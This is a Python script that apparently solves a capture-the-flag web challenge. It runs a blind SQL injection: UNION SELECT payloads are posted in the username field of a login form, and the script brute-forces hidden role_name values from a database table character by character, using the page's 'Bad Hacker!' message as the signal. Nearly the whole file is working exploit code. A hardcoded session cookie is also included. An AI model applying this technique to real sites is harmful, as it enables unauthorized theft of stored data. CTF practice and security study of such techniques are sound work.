import requests, time, string

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'zh-TW,zh;q=0.8',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Origin': 'https://pasteweb.ctf.zoolab.org',
    'Referer': 'https://pasteweb.ctf.zoolab.org/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Sec-GPC': '1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Brave";v="108"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

cookies = {
    'PHPSESSID': 'tbv25cok9cb4c0j93t1mif3u9i',
}

data = {
    'username': '',
    'password': '',
    'current_time': '',
}

character_list = string.printable

def recursive_find_next_char(current_string):

    find = False
    for character in character_list:
        test_string = current_string + character
        payload = f"""
            ' UNION select t1.data, t2.data FROM (
                SELECT role_name AS data, 's' FROM s3cr3t_t4b1e
            ) t1 JOIN (
                SELECT '{test_string}' as data, 's' FROM information_schema.columns
            ) t2 ON substring(t1.data, 1, {len(test_string)}) = t2.data; --
        """.strip()

        data['username'] = payload
        data['current_time'] = int(time.time())
        response = requests.post('https://pasteweb.ctf.zoolab.org/', cookies=cookies, headers=headers, data=data)
        if response.text.split('<p>')[-1].split('</p>')[0] == 'Bad Hacker!':
            recursive_find_next_char(current_string + character)
            find = True

    if not find:
        print(current_string)


if __name__ == '__main__':
    print('==============================  data  ==============================')
    recursive_find_next_char('')